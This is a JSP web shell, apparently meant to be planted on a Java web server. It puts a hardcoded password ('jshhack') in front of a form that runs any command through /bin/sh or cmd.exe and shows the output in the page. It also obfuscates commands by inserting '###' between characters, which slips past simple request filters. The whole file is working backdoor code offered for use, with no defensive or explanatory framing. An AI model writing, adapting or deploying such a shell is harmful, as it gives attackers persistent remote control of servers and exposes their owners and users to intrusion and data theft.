<%@ page contentType="text/html; charset=UTF-8" %>
<%@ page import="java.io.*" %>

<%
    String cmd = request.getParameter("cmd");
    Process ps = null;
    BufferedReader br = null;
    String line = "";
    String result = "";
    String now_page = request.getServletPath();
    String password = "jshhack";
    String input_password = request.getParameter("password");
    String id = (String)session.getAttribute("webshell_id");
    String os = System.getProperty("os.name").toLowerCase();
    String shell = "";

    try {
        if(id == null && input_password == null) {
            %> 
            <form action="<%=now_page%>" method="POST">
                <input type="password" name="password">
                <input type="submit" value="AUTH">
            </form>
    <%
            return;
        } else if(id == null && input_password != null) {
            if(password.equals(input_password)) {
                session.setAttribute("webshell_id", "jshhack");
                response.sendRedirect(now_page);
            } else {
                response.sendRedirect(now_page);
            }
        }

        if(os.indexOf("win") == -1) {
            shell = "/bin/sh -c";
        } else {
            shell = "cmd.exe /c";
        }
        if(cmd != null) {
            cmd = cmd.replace("###", "");
            ps = Runtime.getRuntime().exec(shell + cmd);
            // ps = Runtime.getRuntime().exec("cmd.exe /c" + cmd);  // Windows
            // ps = Runtime.getRuntime().exec("/bin/sh -c" + cmd); // Linux
            br = new BufferedReader(new InputStreamReader(ps.getInputStream()));

            while((line = br.readLine()) != null) {
                result += line + "<br>";
            }

            ps.destroy();
        }
    } finally {
        if (br != null) br.close();
    }
%>
<script>
    document.addEventListener("keydown", (event)=>{if(event.keyCode === 13){cmdRequest()}});
    function cmdRequest() {
        var frm = document.frm;
        var cmd = frm.cmd.value;
        var enc_cmd = "";

        for(i=0;i<cmd.length;i++) {
            enc_cmd += cmd.charAt(i) + "###";
        }
        frm.cmd.value = enc_cmd;
        frm.action = "<%=now_page%>";
        frm.submit();
    }
</script>
<form name="frm" method="POST">
    <input type="text" name="cmd">
    <input type="button" onclick="cmdRequest();" value="EXECUTE">
</form>
<hr>
<% if(cmd != null) { %>
    <table style="border: 1px solid black; background-color: black">
        <tr>
            <td style="color: white; font-size: 12px"><%=result%></td>
        </tr>
    </table>
<% } %>